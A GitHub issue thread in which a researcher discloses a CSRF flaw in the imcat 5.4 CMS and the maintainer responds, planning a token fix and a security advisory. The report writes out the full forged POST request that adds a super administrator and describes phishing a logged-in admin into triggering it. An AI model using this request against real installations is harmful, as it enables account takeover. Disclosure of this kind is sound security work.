=== Content from github.com_d33e918c_20250115_091542.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeacexie%2Fimcat%2Fissues%2F9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeacexie%2Fimcat%2Fissues%2F9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=peacexie%2Fimcat)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[peacexie](/peacexie)
/
**[imcat](/peacexie/imcat)**
Public

* [Notifications](/login?return_to=%2Fpeacexie%2Fimcat) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2Fpeacexie%2Fimcat)
* [Star
   19](/login?return_to=%2Fpeacexie%2Fimcat)

* [Code](/peacexie/imcat)
* [Issues
  2](/peacexie/imcat/issues)
* [Pull requests
  0](/peacexie/imcat/pulls)
* [Actions](/peacexie/imcat/actions)
* [Projects
  0](/peacexie/imcat/projects)
* [Security](/peacexie/imcat/security)
* [Insights](/peacexie/imcat/pulse)

Additional navigation options

* [Code](/peacexie/imcat)
* [Issues](/peacexie/imcat/issues)
* [Pull requests](/peacexie/imcat/pulls)
* [Actions](/peacexie/imcat/actions)
* [Projects](/peacexie/imcat/projects)
* [Security](/peacexie/imcat/security)
* [Insights](/peacexie/imcat/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fpeacexie%2Fimcat%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fpeacexie%2Fimcat%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# CSRF vulnerability in imcat v5.4 #9

Open

[haungtongfu](/haungtongfu) opened this issue
Jun 24, 2021
· 7 comments

Open

# [CSRF vulnerability in imcat v5.4](#top) #9

[haungtongfu](/haungtongfu) opened this issue
Jun 24, 2021
· 7 comments

## Comments

[![@haungtongfu](https://avatars.githubusercontent.com/u/58809869?s=80&v=4)](/haungtongfu)

Copy link

### **[haungtongfu](/haungtongfu)** commented [Jun 24, 2021](#issue-928818710)

| 1. Overview Official website: <http://txjia.com/imcat/>  Version: imcat-5.4  Vulnerability type: CSRF post  Source code: <https://github.com/peacexie/imcat/releases/tag/v5.4>  Harm: Super administrator account can be added 2. Analysis 2.1 logic analysis  In the add administrator page, the security of data source is not verified by token and referer [image](https://user-images.githubusercontent.com/58809869/123199326-3cefa300-d4e1-11eb-932e-08efddf0cba8.png) (1) There is no token used for security verification in the data packet, so there is the possibility of forgery POST /imcat/root/run/adm.php?dops-a&mod=adminer&view=form&stype=& HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 539 Origin: <http://127.0.0.1> Connection: close Referer: <http://127.0.0.1/imcat/root/run/adm.php?dops-a&mod=adminer&view=form&stype=&recbk=ref> Cookie: Hm\_lvt\_948dba1e5d873b9c1f1c77078c521c89=1622443371; CKFinder\_Path=Files%3A%2F%3A1; v49\_sessid\_4294e52897e5=2021-6b-hg49-yttfxda8f-7e5f79d1a; v49\_Uniqueid\_01348a66d0e6=2021-6h-a25c-5s8pgxq58-0e63b0fe2; Hm\_lpvt\_948dba1e5d873b9c1f1c77078c521c89=1622444424; twVscAv\_admauth=1606cECE916XO1gVfiR9ahqpqkEJMTxa4R5XjBOh69Cfppjn2zcpGMtx5x7BRkm4L0Vposdev%2B2ydGfzzC3me67ttA1foMK2UXNSybiOLOvH; v49\_vcodes=fmadm%3Dnull%0Afmcomadd%3D1623809462%2C49f8c2fc48af351f%0Afmapply%3D1623830847%2C7da4f846fdbd0243%0A; v49\_ocar\_items=0; PHPSESSID=5b4be5ad4c47747257ac13a5c15265c9 Upgrade-Insecure-Requests: 1  recbk=http%3A%2F%2F127.0.0.1%2Fimcat%2Froot%2Frun%2Fadm.php%3Fdops-a%26mod%3Dadminer&fm%5Buid%5D=2021-6p-j6xk&fm%5Buno%5D=1&fm%5Buname%5D=qwe\_123&fm%5Bupass%5D=adm\_123&fm%5Bgrade%5D=supper&fm%5Bshow%5D=1&fm%5Bmname%5D=qwe\_123&fm%5Bindep%5D=inadm&fm%5Bmiuid%5D=&fm%5Bmtel%5D=12345678091&fm%5Bmemail%5D=23wqw%4022.com&fm%5Bmaddr%5D=&fm%5Batime%5D=2021-06-21+17%3A14%3A49&fm%5Betime%5D=2021-06-21+17%3A14%3A49&fm%5Bauser%5D=adm\_123&fm%5Beuser%5D=adm\_123&fm%5Baip%5D=127.0.0.1&fm%5Beip%5D=127.0.0.1&bsend=%E6%8F%90%E4%BA%A4&mod=adminer&isadd=1  (2) After deleting the referer: information, you can still add an administrator [image](https://user-images.githubusercontent.com/58809869/123199391-601a5280-d4e1-11eb-865c-24b3f495f397.png) 3. Loophole recurrence (1) Environment preparation, building environment with phpstudy [image](https://user-images.githubusercontent.com/58809869/123199449-79230380-d4e1-11eb-9324-83904a191fc1.png) (2) Construct a payload with the function of creating a super administrator account, qwe\_ 123/adm\_ one hundred and twenty-three <script>history.pushState('', '', '/')</script> (3) Through a variety of fishing means to lure the administrator to click on the page, that is, to complete the action of adding super administrator without the administrator's knowledge ![image](https://user-images.githubusercontent.com/58809869/123199520-9c4db300-d4e1-11eb-8c46-94d9a911babe.png) ![image](https://user-images.githubusercontent.com/58809869/123199525-9f48a380-d4e1-11eb-8d18-87c3044191a5.png) ![image](https://user-images.githubusercontent.com/58809869/123199531-a2dc2a80-d4e1-11eb-9df6-fb13551bbcfe.png) ### 4. Verification of attack results Using qwe\_ 123/adm\_ 123 login in the background [image](https://user-images.githubusercontent.com/58809869/123199588-c010f900-d4e1-11eb-9866-77441732ca44.png) 5. Means of Defense Add a token to the place where important actions are performed for authentication. The value of the token must be random and unpredictable |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=80&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)

Copy link

Owner

### **[peacexie](/peacexie)** commented [Jun 25, 2021](#issuecomment-868103396)

| Can you add an administrator account Befor login an administrator? In fact, you can NOT access the add administrator page!? Like this: {lochost}/root/run/adm.php?dops-a&mod=adminer&view=form&stype=&recbk=ref  You can logout the system, and test the `CSRF vulnerability`. |
| --- |

All reactions

Sorry, something went wrong.

[![@haungtongfu](https://avatars.githubusercontent.com/u/58809869?s=80&v=4)](/haungtongfu)

Copy link

Author

### **[haungtongfu](/haungtongfu)** commented [Jun 25, 2021](#issuecomment-868120690)

| You can understand CSRF attack as follows: the attacker embezzles your identity and sends malicious requests in your name. CSRF can do things like: send e-mail in your name, send messages, steal your account number, even buy goods, transfer money with virtual currency... Problems caused by CSRF include: personal privacy leakage and property security. To complete the CSRF attack, need to interact with the client. The common method is phishing attack, which is completed by enticing legitimate users to click the link sent by the attacker. You're right, you can't access the add user interface before you log in to the background, but in fact, the success rate of CSRF attack is relatively high. In general, the administrator needs to log in to the background and click the link sent by the attacker by various temptation means. |
| --- |

All reactions

Sorry, something went wrong.

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=80&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)

Copy link

Owner

### **[peacexie](/peacexie)** commented [Jun 25, 2021](#issuecomment-868170970) • edited Loading

| It is TRUE that CSRF attack as you said!   * verified by referer:   + but the referer can be forged. * verified by token:   + In the file: /imcat/core/dops/dopFunc.php, there are two method fmSafe() and svSafe(),   + I will add some verifies in these method for the NEXT version.   [fix9](https://user-images.githubusercontent.com/10232274/123364040-4f7fe000-d5a6-11eb-869d-898553ca2b11.png) |
| --- |

All reactions

Sorry, something went wrong.

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=40&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)
[peacexie](/peacexie)
pinned this issue
[Jun 25, 2021](#event-4937802473)

[![@haungtongfu](https://avatars.githubusercontent.com/u/58809869?s=80&v=4)](/haungtongfu)

Copy link

Author

### **[haungtongfu](/haungtongfu)** commented [Jun 25, 2021](#issuecomment-868276433)

| Yes, I recommend using token for authentication！  OK, Thanks! Can you help me requests a CVE？ Requesting a CVE identification number-GitHub Docs [image](https://user-images.githubusercontent.com/58809869/123384407-f2485680-d5c6-11eb-9351-3d4039a96905.png)  Thinks. |
| --- |

All reactions

Sorry, something went wrong.

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=40&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)
[peacexie](/peacexie)
unpinned this issue
[Jun 25, 2021](#event-4938457011)

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=80&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)

Copy link

Owner

### **[peacexie](/peacexie)** commented [Jun 25, 2021](#issuecomment-868360515) • edited Loading

| OK, I created a Security Advisories: It says: You’re ready to publish!, But I con NOT found the publish button; And it also says: This process may take up to 3 working days... Now all we can do is wait!? |
| --- |

All reactions

Sorry, something went wrong.

[![@haungtongfu](https://avatars.githubusercontent.com/u/58809869?s=80&v=4)](/haungtongfu)

Copy link

Author

### **[haungtongfu](/haungtongfu)** commented [Jun 26, 2021](#issuecomment-868930197)

| Thanks！Good luck！ |
| --- |

All reactions

Sorry, something went wrong.

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=80&u=2248ec8da92500a0149584b89382f9a69944e799&v=4)](/peacexie)

Copy link

Owner

### **[peacexie](/peacexie)** commented [Jul 4, 2021](#issuecomment-873543424)

| It is steel a Draft, How to publish it? [How to publish it](https://user-images.githubusercontent.com/10232274/124378066-10f2cf80-dce2-11eb-94ee-e4041daf9fa9.png) |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeacexie%2Fimcat%2Fissues%2F9)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@peacexie](https://avatars.githubusercontent.com/u/10232274?s=52&v=4)](/peacexie) [![@haungtongfu](https://avatars.githubusercontent.com/u/58809869?s=52&v=4)](/haungtongfu)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


